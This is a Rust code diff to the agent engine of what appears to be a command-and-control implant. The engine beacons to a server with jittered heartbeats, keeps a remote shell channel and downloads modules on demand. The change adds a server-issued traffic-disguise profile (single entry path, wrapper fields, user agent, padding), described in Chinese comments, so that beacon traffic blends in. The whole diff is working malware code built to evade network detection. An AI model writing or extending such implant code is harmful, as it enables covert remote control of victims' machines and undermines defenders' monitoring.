@@ -24,6 +24,8 @@ pub struct AgentEngine {
     agent_id: String,
     /// Per-session channel token issued at registration (rotates per session).
     session_token: String,
+    /// 流量伪装 profile（单入口/壳字段/UA/padding），注册响应下发。
+    profile: Option<libra_common::models::ProfileTransform>,
     /// Profile paths adopted at registration (empty = use build-time paths).
     heartbeat_path: String,
     result_path: String,
@@ -53,6 +55,7 @@ impl AgentEngine {
             ws_tx: None,
             agent_id: String::new(),
             session_token: String::new(),
+            profile: None,
             heartbeat_path: String::new(),
             result_path: String::new(),
         }
@@ -95,12 +98,18 @@ impl AgentEngine {
         let agent_id = outcome.agent_id;
         let session_key = outcome.session_key;
         self.session_token = outcome.session_token.clone().unwrap_or_default();
-        self.heartbeat_path = outcome.heartbeat_path;
-        self.result_path = outcome.result_path;
 
-        // Adopt the per-session channel token for all subsequent requests.
-        if let Some(t) = outcome.session_token {
-            http.set_session_token(t);
+        // 采用单入口流量伪装 profile（路径/壳字段/UA/padding）
+        if let Some(p) = outcome.profile {
+            self.profile = Some(p.clone());
+            http.set_profile(p);
+        }
+        // 心跳节奏覆盖（服务端 profile 下发值优先于构建时值）
+        if outcome.heartbeat_interval_ms > 0 {
+            self.config.heartbeat_interval_ms = outcome.heartbeat_interval_ms;
+        }
+        if outcome.jitter_percent > 0.0 {
+            self.config.jitter_percent = outcome.jitter_percent;
         }
 
         // Establish AES-256-GCM session key from the RSA-encrypted blob.
@@ -145,30 +154,23 @@ impl AgentEngine {
         let _http = self.http.as_ref().ok_or("HTTP not initialized")?;
         let agent_id = self.agent_id.clone();
         let server_url = self.config.server_url.clone();
+        // 单入口模式：所有 beacon 流量走同一入口路径（注册前为 register_path，
+        // 注册后 HttpCommunicator 已切换为 profile.entry_path）。
         let register_path = self.config.register_path.clone();
-        // 优先使用注册时服务端下发的 profile 路径，缺省回退构建时路径。
-        let heartbeat_path = if self.heartbeat_path.is_empty() {
-            self.config.heartbeat_path.clone()
-        } else {
-            self.heartbeat_path.clone()
-        };
-        let result_path = if self.result_path.is_empty() {
-            self.config.result_path.clone()
-        } else {
-            self.result_path.clone()
-        };
 
         let (shell_tx, mut shell_rx) = tokio::sync::mpsc::unbounded_channel::<WebSocketMessage>();
         let hb_key = self.crypto.session_key();
         let hb_interval_ms = self.config.heartbeat_interval_ms;
         let hb_jitter = self.config.jitter_percent;
         let session_token = self.session_token.clone();
+        let profile = self.profile.clone();
 
         // Cloud module manager — downloads modules on demand (shared with the
-        // heartbeat task that executes one-shot tasks).
+        // heartbeat task that executes one-shot tasks). 单入口：路径参数用
+        // register_path（communicator 已切换到 profile.entry_path）。
         let module_manager = std::sync::Arc::new(tokio::sync::Mutex::new(
             crate::module_manager::ModuleManager::new(
-                &server_url, &register_path, &heartbeat_path, &result_path,
+                &server_url, &register_path, &register_path, &register_path,
                 agent_id.clone(), hb_key, Some(session_token.clone()),
             ),
         ));
@@ -190,9 +192,12 @@ impl AgentEngine {
         let hb_reconnect = reconnect_tx.clone();
         let hb_gate = shared.clone();
         tokio::spawn(async move {
-            let mut hb_http = HttpCommunicator::new(&server_url, &register_path, &heartbeat_path, &result_path);
+            let mut hb_http = HttpCommunicator::new(&server_url, &register_path, &register_path, &register_path);
             if !session_token.is_empty() {
                 hb_http.set_session_token(session_token);
+            }
+            if let Some(p) = profile {
+                hb_http.set_profile(p);
             }
             loop {
                 match heartbeat_tick(&hb_http, &agent_id, hb_key.as_ref(), &hb_mm).await {
